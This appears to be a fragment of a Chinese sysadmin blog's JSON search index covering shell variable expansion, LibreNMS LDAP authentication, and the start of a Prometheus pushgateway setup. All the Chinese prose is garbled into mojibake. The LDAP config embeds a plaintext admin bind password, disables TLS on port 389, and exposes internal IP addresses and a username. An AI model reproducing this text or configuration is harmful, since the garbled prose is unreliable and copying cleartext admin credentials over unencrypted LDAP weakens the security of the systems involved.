å†…å®¹ä¸º\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar2\u003c/span\u003e\u003cspan class=\"k\"\u003e:-\u003c/span\u003e\u003cspan class=\"nv\"\u003eword\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# å†…å®¹ä¸º\u0026#34;word\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e${var:+word} å¦‚æœå˜é‡varæœ‰å€¼ä¸”ä¸ä¸ºç©ºï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word\u003c/p\u003e\n\u003cp\u003e${var=word} å¦‚æœå˜é‡varæœªèµ‹å€¼ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²wordï¼Œå¹¶ä¸ºvarèµ‹å€¼ä¸ºå­—ç¬¦ä¸²word\u003c/p\u003e\n\u003cp\u003e${var:=word} å¦‚æœå˜é‡varæœªèµ‹å€¼æˆ–è€…å€¼ä¸ºç©ºä¸²ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²wordï¼Œå¹¶ä¸ºvarèµ‹å€¼ä¸ºå­—ç¬¦ä¸²word\u003c/p\u003e\n\u003cp\u003e${var?word} å¦‚æœå˜é‡varæœªèµ‹å€¼ï¼Œå°†å­—ç¬¦ä¸²wordä½œä¸ºæ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œå¦åˆ™è¿”å›å˜é‡varçš„å€¼\u003c/p\u003e","title":"Shellä¸­å˜é‡ã€å­—ç¬¦ä¸²ã€æ•°ç»„ã€å‚æ•°çš„æŠ€å·§"},{"content":"æˆ‘ä»¬openldapä¸­ç”¨æˆ·å’Œç»„çš„è®¾ç½®\nç”¨æˆ·ï¼š ou=People,dc=ddky,dc=com #uid;#givenName;#sn;#uidNumber;#gidNumber ç»„ï¼š ou=group,dc=ddky,dc=com #cn;#gidNumber;#memberUID;#description åˆ°librenmsä¸­ï¼Œ 172.18.31.10\ncd /opt/librenms vi config.php $config[\u0026#39;auth_mechanism\u0026#39;] = \u0026#39;ldap\u0026#39;; $config[\u0026#39;auth_ldap_server\u0026#39;] = \u0026#39;172.18.31.27\u0026#39;; $config[\u0026#39;auth_ldap_port\u0026#39;] = 389; $config[\u0026#39;auth_ldap_starttls\u0026#39;] = False; // Disable TLS on port 389 $config[\u0026#39;auth_ldap_binddn\u0026#39;] = \u0026#39;cn=admin,dc=ddky,dc=com\u0026#39;; // overrides binduser $config[\u0026#39;auth_ldap_bindpassword\u0026#39;] = \u0026#39;nishiwode\u0026#39;; $config[\u0026#39;auth_ldap_prefix\u0026#39;] = \u0026#39;cn=\u0026#39;; $config[\u0026#39;auth_ldap_suffix\u0026#39;] = \u0026#39;,ou=People,dc=ddky,dc=com\u0026#39;; // appended to usernames $config[\u0026#39;auth_ldap_groupbase\u0026#39;] = \u0026#39;ou=group,dc=ddky,dc=com\u0026#39;; // all groups must be inside this $config[\u0026#39;auth_ldap_groups\u0026#39;][\u0026#39;admins\u0026#39;][\u0026#39;level\u0026#39;] = 10; // set admins group to admin level $config[\u0026#39;auth_ldap_groups\u0026#39;][\u0026#39;pfy\u0026#39;][\u0026#39;level\u0026#39;] = 5; // set pfy group to global read only level $config[\u0026#39;auth_ldap_groups\u0026#39;][\u0026#39;support\u0026#39;][\u0026#39;level\u0026#39;] = 1; // set support group as a normal user $config[\u0026#39;auth_ldap_debug\u0026#39;] = false; // enable for verbose debug messages è¯´æ˜ï¼š æˆ‘ä»¬çš„openldapå› ä¸ºæ˜¯å†…éƒ¨ä½¿ç”¨ï¼Œæ‰€ä»¥æ— æ³•è®¾ç½®è¯ä¹¦ï¼ŒTLSæ˜¯è¢«ç¦æ­¢çš„ã€‚ openldapæ˜¯ç¦æ­¢anonymousç”¨æˆ·æŸ¥è¯¢çš„ï¼Œæ‰€ä»¥éœ€è¦è®¾ç½®binddnå’Œbindpassword å®é™…ç”¨æˆ·æ˜¯cn=zhangranrui,ou=People,dc=ddky,dc=comï¼Œæ‰€ä»¥è¦è®¾prefix librenmsç¼ºçœç”¨æˆ·æœ‰ä¸‰ä¸ªçº§åˆ«ï¼Œ10 5 1ï¼Œå¯¹åº”çš„ç”¨æˆ·ç»„æ˜¯admins pfy support\nå¦‚æœè¦å¯¹æ¥å…¶ä»–ç³»ç»Ÿï¼Œä¹Ÿè®¸éƒ½éœ€è¦å¦‚æ³•ç‚®åˆ¶\n","permalink":"https://rendoumi.com/posts/20231213-librenms_ldap/","summary":"\u003cp\u003eæˆ‘ä»¬openldapä¸­ç”¨æˆ·å’Œç»„çš„è®¾ç½®\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eç”¨æˆ·\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼š\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003eou\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ePeople\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eddky\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ecom\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003euid\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003egivenName\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003esn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003euidNumber\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003egidNumber\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003eç»„\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼š\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003eou\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003egroup\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eddky\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ecom\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003ecn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003egidNumber\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003ememberUID\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003edescription\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåˆ°librenmsä¸­ï¼Œ 172.18.31.10\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ecd\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eopt\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003elibrenms\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003evi\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003econfig\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ephp\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_mechanism\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eldap\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_server\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003e172\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003e18\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003e31\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003e27\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_port\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003e389\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_starttls\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eFalse\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e               \u003c/span\u003e\u003cspan class=\"c1\"\u003e// Disable TLS on port 389\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_binddn\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003ecn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eadmin\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eddky\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ecom\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c1\"\u003e// overrides binduser\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_bindpassword\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003enishiwode\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_prefix\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003ecn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_suffix\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003eou\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ePeople\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eddky\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ecom\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"c1\"\u003e// appended to usernames\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_groupbase\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eou\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003egroup\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eddky\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ecom\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c1\"\u003e// all groups must be inside this\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_groups\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eadmins\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003elevel\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e             \u003c/span\u003e\u003cspan class=\"c1\"\u003e// set admins group to admin level\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_groups\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003epfy\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003elevel\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e                \u003c/span\u003e\u003cspan class=\"c1\"\u003e// set pfy group to global read only level\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_groups\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003esupport\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003elevel\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"c1\"\u003e// set support group as a normal user\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_debug\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e                 \u003c/span\u003e\u003cspan class=\"c1\"\u003e// enable for verbose debug messages\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¯´æ˜ï¼š\næˆ‘ä»¬çš„openldapå› ä¸ºæ˜¯å†…éƒ¨ä½¿ç”¨ï¼Œæ‰€ä»¥æ— æ³•è®¾ç½®è¯ä¹¦ï¼ŒTLSæ˜¯è¢«ç¦æ­¢çš„ã€‚\nopenldapæ˜¯ç¦æ­¢anonymousç”¨æˆ·æŸ¥è¯¢çš„ï¼Œæ‰€ä»¥éœ€è¦è®¾ç½®binddnå’Œbindpassword\nå®é™…ç”¨æˆ·æ˜¯cn=zhangranrui,ou=People,dc=ddky,dc=comï¼Œæ‰€ä»¥è¦è®¾prefix\nlibrenmsç¼ºçœç”¨æˆ·æœ‰ä¸‰ä¸ªçº§åˆ«ï¼Œ10 5 1ï¼Œå¯¹åº”çš„ç”¨æˆ·ç»„æ˜¯admins pfy support\u003c/p\u003e","title":"Librenmsä½¿ç”¨ldapè®¤è¯ç”¨æˆ·"},{"content":"librenmsæ˜¯ä¸ªéå¸¸å¼ºæ‚çš„å·¥å…·ï¼Œå¯¹ç½‘ç»œä¸æ¸…æ¥šçš„å¯ä»¥é€è¿‡è¿™ä¸ªå·¥å…·ï¼Œå¯¹ç½‘ç»œç¯å¢ƒæœ‰æ¸…æ™°çš„äº†è§£ã€‚\nå¦‚ä½•é€šè¿‡prometheuså¯¹librenmsè¿›è¡Œé›†æˆå‘¢ï¼Ÿ\nä¸€ã€è£…pushgateway\nwget https://github.com/prometheus/pushgateway/releases/download/v1.2.0/pushgateway-1.2.0.linux-amd64.tar.gz æŠŠpushgatewayæ”¾åˆ°/usr/local/bin cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt;/etc/systemd/system/pushgateway.service [Unit] Description=Codis Exporter Wants=network-online.target After=network-online.target [Service] Type=simple ExecStart=/usr/local/bin/pushgateway --web.listen-address=:50004 [Install] WantedBy=multi-user.target EOF systemctl daemon-relaod systemctl enable --now pushgateway.service äºŒã€é…ç½®librenms\ncd /opt/librenms vi 